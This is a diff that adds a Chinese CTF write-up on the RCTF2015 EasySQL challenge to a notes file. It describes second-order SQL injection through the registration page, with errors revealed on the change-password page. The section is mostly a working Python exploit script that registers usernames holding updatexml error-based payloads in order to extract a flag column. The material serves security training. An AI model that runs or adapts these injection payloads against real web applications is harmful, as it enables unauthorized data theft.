@@ -3546,3 +3546,78 @@ url解码之后就是 `?code=phpinfo();`
     echo $res;
     ```
     将得到的结果输入即可返回flag
+
+## RCTF2015-EasySQL(二次注入+报错注入)
+
+**注册页面写入payload，在修改密码界面输出结果**
+
+1. 首页显示注册登录，所以首先注册，可以用bp做一下fuzz测试，看一下关键词过滤
+2. 注册时发现只要用户名不包含被过滤的关键词都能注册成功，而且可以登录
+3. fuzz测试发现`or`,`and`等关键词都被过滤，而且在登陆界面尝试注入也没有结果
+4. 正常登录，发现有修改密码页面，但是正常操作没有回显，但是注册的时候如果写的用户名包含特殊符号，在这个页面就会显示报错信息
+
+    这就是二次注入的特征
+
+    二次注入脚本。
+
+    ```python
+    import requests
+
+    url = 'http://6407a4c8-5477-4bc2-a1af-bd1b03c751d6.node5.buuoj.cn:81/'
+    reg = 'register.php'
+    log = 'login.php'
+    change = 'changepwd.php'
+
+    pre = 'mochu7"'
+    #逆序闭合
+    resuf = "')))),1))#"
+
+    #正序闭合
+    suf = "'))),1))#"
+
+    s = 'abcdefghijklmnopqrstuvwxyz1234567890'
+    s = list(s)
+
+    r = requests.session()
+
+    def register(name):
+        data = {
+            'username' : name,
+            'password' : '123',
+            'email' : '123',
+        }
+        r.post(url=url+reg, data=data)
+
+    def login(name):
+        data = {
+            'username' : name,
+            'password' : '123',
+        }
+        r.post(url=url+log, data=data)
+
+    def changepwd():
+        data = {
+            'oldpass' : '',
+            'newpass' : '',
+        }
+        res = r.post(url=url+change, data=data)
+        if 'XPATH' in res.text:
+            flag = res.text.split('~')
+            print(flag[1])
+            # print(res.text)
+
+    for i in s:
+        #正序
+        # paylaod = pre + "||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
+        #逆序
+        paylaod = pre + "||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + resuf
+        register(paylaod)
+        login(paylaod)
+        changepwd()
+
+
+    #正序payload
+    #paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"
+    #逆序payload
+    #paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"
+    ```
